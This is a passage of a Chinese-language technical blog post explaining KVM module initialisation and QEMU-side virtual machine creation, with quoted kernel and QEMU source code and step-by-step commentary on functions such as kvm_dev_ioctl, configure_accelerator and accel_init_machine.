最小值不需要计算，因为对于所有机器，它将始终为 1。</span><br><span class="hljs-comment">         */</span><br>        u64 max = min(<span class="hljs-number">0x7fffffff</span>ULL,<br>                      __scale_tsc(kvm_max_tsc_scaling_ratio, tsc_khz));<br>        <br>        <span class="hljs-comment">// 将计算得到的最大值存储在 kvm_max_guest_tsc_khz 变量中。</span><br>        kvm_max_guest_tsc_khz = max;<br><br>        <span class="hljs-comment">// 计算并设置默认的 TSC 缩放比例。</span><br>        kvm_default_tsc_scaling_ratio = <span class="hljs-number">1ULL</span> &lt;&lt; kvm_tsc_scaling_ratio_frac_bits;<br>    &#125;<br><br>    <span class="hljs-comment">// 初始化 MSR 列表，用于处理特定的模型相关寄存器。</span><br>    kvm_init_msr_list();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>该函数首先调用了架构特定的 <code>hardware_setup</code> 函数，进行硬件初始化操作，以确保虚拟化的相关硬件支持得以正确配置。</li><li>如果支持 TSC 控制，代码会对 TSC 进行相关配置，计算并设置合适的 TSC 缩放比例，并将其存储在相关变量中。</li><li>最后，函数进行 MSR 列表的初始化，这些 MSR 用于处理特定的模型相关寄存器。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __init <span class="hljs-title">vmx_check_processor_compat</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *rtn)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vmcs_config</span> <span class="hljs-title">vmcs_conf</span>;</span><br><br>    *(<span class="hljs-keyword">int</span> *)rtn = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-comment">// 设置并获取当前CPU的 VMCS 配置</span><br>    <span class="hljs-keyword">if</span> (setup_vmcs_config(&amp;vmcs_conf) &lt; <span class="hljs-number">0</span>)<br>        *(<span class="hljs-keyword">int</span> *)rtn = -EIO;<br>    <br>    <span class="hljs-comment">// 检查当前CPU的 VMCS 配置是否与预期的配置相符</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(&amp;vmcs_config, &amp;vmcs_conf, <span class="hljs-keyword">sizeof</span>(struct vmcs_config)) != <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;kvm: CPU %d feature inconsistency!\n&quot;</span>,<br>               smp_processor_id());<br>        *(<span class="hljs-keyword">int</span> *)rtn = -EIO;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>vmx_check_processor_compat</code> 是一个初始化函数，用于检查当前CPU的虚拟化兼容性。</li><li><code>*(int *)rtn = 0;</code> 初始化返回值为0，表示兼容性检查通过。</li><li><code>setup_vmcs_config(&amp;vmcs_conf)</code> 调用 <code>setup_vmcs_config</code> 函数，获取当前CPU的 VMCS 配置信息，存储在 <code>vmcs_conf</code> 结构中。</li><li>如果获取配置失败，则设置返回值为 <code>-EIO</code>，表示I/O错误。</li><li><code>memcmp(&amp;vmcs_config, &amp;vmcs_conf, sizeof(struct vmcs_config)) != 0</code> 对比当前CPU的 VMCS 配置与预期的配置是否一致。</li><li>如果配置不一致，输出错误信息，并设置返回值为 <code>-EIO</code>，表示兼容性检查失败。</li><li>在hardware_setup函数中调用setup_vmcs_config这一步骤的目的是确保在不同的物理CPU上，使用相同的虚拟机配置（<code>vmcs_config</code>），以确保 VCPIU 在不同物理 CPU 上调度时的一致性和稳定性。因为不同的硬件特性可能会导致不同的虚拟化行为，而通过比较并保持一致的 VMCS 配置，可以尽量减少在不同硬件间出现问题的可能性。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">kvm_chardev_ops</span> =</span> &#123;<br>.unlocked_ioctl = kvm_dev_ioctl,<br>.compat_ioctl   = kvm_dev_ioctl,<br>.llseek= noop_llseek,<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">miscdevice</span> <span class="hljs-title">kvm_dev</span> =</span> &#123;<br>KVM_MINOR,<br><span class="hljs-string">&quot;kvm&quot;</span>,<br>&amp;kvm_chardev_ops,<br>&#125;;<br><br><br></code></pre></td></tr></table></figure><p>kvm_init的最后一个重要工作是创建一个misc设备“/dev/kvm”</p><p>可以看到，该设备只支持ioctl系统调用，当然，open和close这些系统调用会被misc设备框架处理。kvm_dev_ioctl代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">kvm_dev_ioctl</span><span class="hljs-params">(struct file *filp,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ioctl, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">long</span> r = -EINVAL;<br><br><span class="hljs-keyword">switch</span> (ioctl) &#123;<br><span class="hljs-keyword">case</span> KVM_GET_API_VERSION:<br><span class="hljs-keyword">if</span> (arg)<br><span class="hljs-keyword">goto</span> out;<br>r = KVM_API_VERSION;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_CREATE_VM:<br>r = kvm_dev_ioctl_create_vm(arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_CHECK_EXTENSION:<br>r = kvm_vm_ioctl_check_extension_generic(<span class="hljs-literal">NULL</span>, arg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_GET_VCPU_MMAP_SIZE:<br><span class="hljs-keyword">if</span> (arg)<br><span class="hljs-keyword">goto</span> out;<br>r = PAGE_SIZE;     <span class="hljs-comment">/* struct kvm_run */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_X86</span><br>r += PAGE_SIZE;    <span class="hljs-comment">/* pio data page */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> KVM_COALESCED_MMIO_PAGE_OFFSET</span><br>r += PAGE_SIZE;    <span class="hljs-comment">/* coalesced mmio ring page */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> KVM_TRACE_ENABLE:<br><span class="hljs-keyword">case</span> KVM_TRACE_PAUSE:<br><span class="hljs-keyword">case</span> KVM_TRACE_DISABLE:<br>r = -EOPNOTSUPP;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> kvm_arch_dev_ioctl(filp, ioctl, arg);<br>&#125;<br>out:<br><span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>kvm_dev_ioctl</code> 函数是用于处理 <code>/dev/kvm</code> 设备的 ioctl 请求的主要函数。</li><li>根据不同的 ioctl 请求，函数执行相应的操作。</li><li>对于通用接口，比如 <code>KVM_GET_API_VERSION</code>、<code>KVM_CREATE_VM</code> 和 <code>KVM_CHECK_EXTENSION</code>，执行相应的处理，并返回相应的结果。</li><li>对于架构相关的接口，调用 <code>kvm_arch_dev_ioctl</code> 函数进行处理，该函数会根据架构不同，进一步处理 ioctl 请求。</li><li>对于其他一些 ioctl 请求，如 <code>KVM_GET_VCPU_MMAP_SIZE</code>，计算并返回与虚拟机运行有关的内存大小。</li><li>如果是不支持的操作，返回错误码 -EOPNOTSUPP。</li><li>处理了 KVM 设备的 ioctl 请求，根据不同的请求类型，执行相应的操作</li></ul><p><strong>总结一下kvm模块初始化到底做了什么：</strong></p><ol><li><strong>硬件检查：</strong> 初始化过程首先会进行硬件检查，确保主机的硬件支持虚拟化扩展，如 Intel VT-x 或 AMD-V。这些硬件扩展允许虚拟机在更加隔离的环境中运行，提高性能和安全性。</li><li><strong>分配结构缓存：</strong> KVM 初始化过程分配了一些常用的数据结构的缓存，这些结构将用于管理虚拟机和虚拟 CPU 的状态。</li><li><strong>创建设备节点：</strong> 通过创建 <code>/dev/kvm</code> 设备节点，用户空间程序可以通过这个设备与 KVM 内核模块进行通信，发起虚拟化请求和操作。</li><li><strong>获取 VMCS 配置：</strong> 在初始化过程中，KVM 模块会获取 VMCS（Virtual Machine Control Structure）的配置信息，这些信息用于初始化 VMCS 结构。VMCS 是一个关键的数据结构，用于控制虚拟机运行的各个方面。</li><li><strong>设置全局变量：</strong> 根据主机 CPU 的特性和支持，KVM 模块会设置一些全局变量，以适应不同的硬件环境。例如，根据 CPU 是否支持 EPT（Extended Page Tables）等特性，设置相应的全局标志。</li><li><strong>为每个物理 CPU 分配 VMCS：</strong> KVM 初始化过程会为每个物理 CPU 分配一个 VMCS 结构，并将这些结构保存在 percpu 变量中。这为虚拟机在不同的物理 CPU 上切换和调度提供了支持。</li><li><strong>进入 VMX 模式：</strong> 在初始化过程中，并没有将 CPU 设置为 VMX 模式。VMX 模式是虚拟机扩展的一种硬件虚拟化模式，需要通过设置 CR4 寄存器的 VMXE 位并分配 VMXON 区域来开启。然而，在创建第一个虚拟机之前，这些步骤不会执行。这是一种惰性策略，只有在实际需要创建虚拟机时才会启用 VMX 模式，以避免不必要的开销。</li></ol><p>综上所述，KVM 模块的初始化过程主要包括硬件检查、资源分配、设备节点创建、全局变量设置、VMCS 配置等步骤。该过程确保了在虚拟化环境下能够准备好必要的数据结构和配置，以便在创建和管理虚拟机时进行有效的虚拟化操作。真正的 VMX 模式开启是在创建第一个虚拟机时才会执行，以避免不必要的性能损耗。</p><h2 id="4-3-虚拟机的创建"><a href="#4-3-虚拟机的创建" class="headerlink" title="4.3 虚拟机的创建"></a>4.3 虚拟机的创建</h2><p>要创建一个KVM虚拟机，需要用户侧的QEMU发起请求，下面从QEMU和KVM两个方面来考察KVM虚拟机创建过程</p><h3 id="4-3-1-QEMU侧虚拟机的创建"><a href="#4-3-1-QEMU侧虚拟机的创建" class="headerlink" title="4.3.1 QEMU侧虚拟机的创建"></a>4.3.1 QEMU侧虚拟机的创建</h3><p>当在QEMU命令行加入–enable-kvm时，解析会进入下面的case分支，给machine optslist这个参数项加了一个accel=kvm参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> QEMU_OPTION_enable_kvm:<br>    olist = qemu_find_opts(<span class="hljs-string">&quot;machine&quot;</span>);<br>    qemu_opts_parse_noisily(olist, <span class="hljs-string">&quot;accel=kvm&quot;</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>该case处理命令行选项<code>QEMU_OPTION_enable_kvm</code>，这个选项是在命令行中加入了<code>--enable-kvm</code>时触发的</p><p>在这个分支中，首先声明了一个<code>olist</code>变量，它指向一个<code>QemuOptsList</code>对象。这是一个用于存储QEMU选项的列表，这里的<code>olist</code>用于查找名为<code>&quot;machine&quot;</code>的选项。</p><p><strong><code>qemu_find_opts</code>函数：</strong> 这个函数用于查找与给定选项名匹配的<code>QemuOptsList</code>对象。在这里，它用于查找名为<code>&quot;machine&quot;</code>的选项对应的<code>QemuOptsList</code>对象。</p><p><code>qemu_opts_parse_noisily</code>函数目的是在给定的<code>QemuOptsList</code>列表中创建一个新的<code>QemuOpts</code>对象，并从提供的参数字符串中解析选项值<br><strong>参数说明：</strong></p><ul><li><code>list</code>：指向一个<code>QemuOptsList</code>对象，表示要在其中创建新的<code>QemuOpts</code>对象。</li><li><code>params</code>：一个包含参数字符串的C风格字符数组，其中包含要解析的选项及其值。</li><li><code>permit_abbrev</code>：一个布尔值，如果为<code>true</code>，则允许第一个<code>key=value</code>在参数字符串中省略<code>key=</code>，并且会被视为<code>list-&gt;implied_opt_name</code>的键值对。</li></ul><p>一个QEMU命令行实例：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qemu</span>-system-x<span class="hljs-number">86</span>_<span class="hljs-number">64</span> --enable-kvm -machine accel=kvm -m <span class="hljs-number">2</span>G -cpu host -hda ubuntu.img<br></code></pre></td></tr></table></figure><ul><li>使用了<code>--enable-kvm</code>参数来启用KVM虚拟化加速</li><li>使用了<code>-machine accel=kvm</code>选项来指定虚拟机的加速方式为KVM</li><li><code>-m 2G</code>用于分配2GB内存给虚拟机</li><li><code>-cpu host</code>用于使用宿主机的CPU特性</li><li><code>-hda ubuntu.img</code>指定虚拟机的硬盘镜像</li></ul><p>之后main函数会在4360行调用<code>configure_accelerator(current_machine)</code>，该函数会从machine的参数列表中取出accel的值，找出所属的类型，<strong>然后调用accel_init_machine</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">configure_accelerator</span><span class="hljs-params">(MachineState *ms)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *p;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">10</span>];<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">bool</span> accel_initialised = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">bool</span> init_failed = <span class="hljs-literal">false</span>;<br>    AccelClass *acc = <span class="hljs-literal">NULL</span>;<br><br>    p = qemu_opt_get(qemu_get_machine_opts(), <span class="hljs-string">&quot;accel&quot;</span>);<br>    <span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">/* Use the default &quot;accelerator&quot;, tcg */</span><br>        p = <span class="hljs-string">&quot;tcg&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (!accel_initialised &amp;&amp; *p != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;:&#x27;</span>) &#123;<br>            p++;<br>        &#125;<br>        p = get_opt_name(buf, <span class="hljs-keyword">sizeof</span>(buf), p, <span class="hljs-string">&#x27;:&#x27;</span>);<br>        acc = accel_find(buf);<br>        <span class="hljs-keyword">if</span> (!acc) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\&quot;%s\&quot; accelerator not found.\n&quot;</span>, buf);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (acc-&gt;available &amp;&amp; !acc-&gt;available()) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s not supported for this target\n&quot;</span>,<br>                   acc-&gt;name);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        ret = accel_init_machine(acc, ms);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            init_failed = <span class="hljs-literal">true</span>;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;failed to initialize %s: %s\n&quot;</span>,<br>                    acc-&gt;name,<br>                    strerror(-ret));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            accel_initialised = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!accel_initialised) &#123;<br>        <span class="hljs-keyword">if</span> (!init_failed) &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;No accelerator found!\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (init_failed) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Back to %s accelerator.\n&quot;</span>, acc-&gt;name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>accel_init_machine这段代码实现了加速器的初始化过程，特别是针对 KVM 加速器，它会创建一个新的 <code>KVMState</code> 对象，将其赋值给虚拟机的 <code>accelerator</code> 成员，并调用加速器的初始化回调函数。如果初始化失败，则会清除相应的状态。这样，在虚拟机运行时，KVM 加速器将能够根据加速器状态进行加速操作</p><ol><li>首先，<code>accel_init_machine</code> 函数被调用，用于初始化特定的加速器（AccelClass）。</li><li>在此函数中，首先获取了加速器的类对象（<code>ObjectClass</code>）和类名（<code>cname</code>）。</li><li>接下来，通过调用 <code>object_new(cname)</code> 创建了一个新的 <code>AccelState</code> 对象，该对象是特定加速器的状态数据结构，对于 KVM 加速器来说，实际上是一个 <code>KVMState</code> 对象。</li><li>然后，将新创建的 <code>AccelState</code>（即 <code>KVMState</code>）对象赋值给虚拟机的 <code>accelerator</code> 成员，即 <code>ms-&gt;accelerator = accel;</code>。</li><li>设置 <code>acc-&gt;allowed</code> 为 <code>true</code>，表示允许使用此加速器。</li><li>调用加速器的 <code>init_machine</code> 回调函数，对于 KVM 加速器来说，这是 <code>kvm_init</code> 函数。<ol><li>如果 <code>init_machine</code> 函数返回值小于 0，表示初始化失败，于是清空虚拟机的 <code>accelerator</code> 成员，并将 <code>acc-&gt;allowed</code> 设置为 <code>false</code>，同时释放之前创建的 <code>AccelState</code> 对象（<code>object_unref(OBJECT(accel));</code>）。</li></ol></li><li>最后，返回 <code>init_machine</code> 的返回值。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">accel_init_machine</span><span class="hljs-params">(AccelClass *acc, MachineState *ms)</span></span><br><span class="hljs-function"></span>&#123;<br>    ObjectClass *oc = OBJECT_CLASS(acc);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *cname = object_class_get_name(oc);<br>    AccelState *accel = ACCEL(object_new(cname));  <span class="hljs-comment">// KVMState</span><br>    <span class="hljs-keyword">int</span> ret;<br>    ms-&gt;accelerator = accel;<br>    *(acc-&gt;allowed) = <span class="hljs-literal">true</span>;<br>    ret = acc-&gt;init_machine(ms); <span class="hljs-comment">//对于 KVM 加速器来说，这是 `kvm_init` 函数</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        ms-&gt;accelerator = <span class="hljs-literal">NULL</span>;<br>        *(acc-&gt;allowed) = <span class="hljs-literal">false</span>;<br>        object_unref(OBJECT(accel));<br>    &#125;<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>在 QEMU 中，使用 <code>KVMState</code> 结构体来表示与 KVM 相关的数据结构</p></blockquote><p>kvm_init函数通过 KVM 在硬件层面提供加速功能，以提高虚拟机的性能和效率。它会检查 KVM 是否支持所需的功能，然后创建虚拟机并进行一些初始化工作，确保虚拟机能够正确运行在 KVM 加速器上</p><ol><li><strong>打开 KVM 设备</strong>：首先，函数尝试打开 “/dev/kvm” 设备，通过系统调用 <code>qemu_open</code>。如果打开失败，会输出错误信息并返回错误码。</li><li><strong>检查 KVM 版本</strong>：使用 <code>KVM_GET_API_VERSION</code> ioctl 查询 KVM API 版本，并与代码中定义的 <code>KVM_API_VERSION</code> 进行比较，以确保 KVM 版本支持。如果版本检查失败，会输出相应的错误信息。</li><li><strong>创建虚拟机（VM）</strong>：通过 <code>KVM_CREATE_VM</code> ioctl 在 KVM 层面创建一个虚拟机，并将文件描述符保存到 <code>KVMState</code> 结构体的成员变量中。这个虚拟机将用于承载客户机的运行。</li><li><strong>检查扩展支持</strong>：使用不同的 <code>kvm_check_extension</code> 函数检查 KVM 是否支持各种特性和扩展，如内存插槽数量、虚拟 CPU 事件、协同 MMIO、IRQ 路由等。如果不支持某些扩展，会输出相应的错误信息。</li><li><strong>初始化架构相关内容</strong>：调用 <code>kvm_arch_init</code> 函数，完成一些与特定架构相关的初始化工作，如对于 x86 架构，需要设置支持 vm86 模式的一些 IOCTL。</li><li><strong>创建 IRQCHIP</strong>：如果允许使用 IRQCHIP，调用 <code>kvm_irqchip_create</code> 函数创建 IRQ 控制器。</li><li><strong>注册监听器</strong>：注册 MEMORY 和 IO 监听器，用于处理内存和 I/O 的事件，例如内存区域的读写。</li><li><strong>设置中断处理函数</strong>：将中断处理函数指向 <code>kvm_handle_interrupt</code>，该函数用于处理中断事件。</li><li><strong>其他功能设置</strong>：设置一些其他的参数和功能，如多个 IOEVENTFD 支持等。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">kvm_init</span><span class="hljs-params">(MachineState 